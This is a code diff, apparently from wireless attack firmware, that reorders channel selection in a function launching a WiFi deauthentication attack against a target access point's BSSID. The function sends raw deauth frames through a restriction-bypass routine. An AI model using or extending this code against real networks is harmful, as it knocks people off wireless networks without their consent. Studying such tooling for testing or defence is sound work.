@@ -652,25 +652,27 @@ AGAIN:
 void target_atk(const String &tssid, const String &mac, uint8_t channel) {
     resetGlobalState();
     cleanlyStopWebUiForWiFiFeature();
-    if (!wifi_atk_setWifi()) return;
 
     uint8_t bssid[6];
     sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
            &bssid[0], &bssid[1], &bssid[2],
            &bssid[3], &bssid[4], &bssid[5]);
 
-    bool found = false;
-    int actualChannel = getAPChannel(bssid, &found);
-    
-    if (!found || actualChannel == 0) {
-        actualChannel = channel;
-    }
+    int actualChannel = channel;
     
     if (actualChannel == 0 || actualChannel > 14) {
-        actualChannel = 1;
+        bool found = false;
+        int scannedChannel = getAPChannel(bssid, &found);
+        if (found && scannedChannel > 0 && scannedChannel <= 14) {
+            actualChannel = scannedChannel;
+        } else {
+            actualChannel = 1;
+        }
     }
 
     ap_record.primary = actualChannel;
+
+    if (!wifi_atk_setWifi()) return;
 
     memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
     wsl_bypasser_send_raw_frame(&ap_record, actualChannel, _default_target);
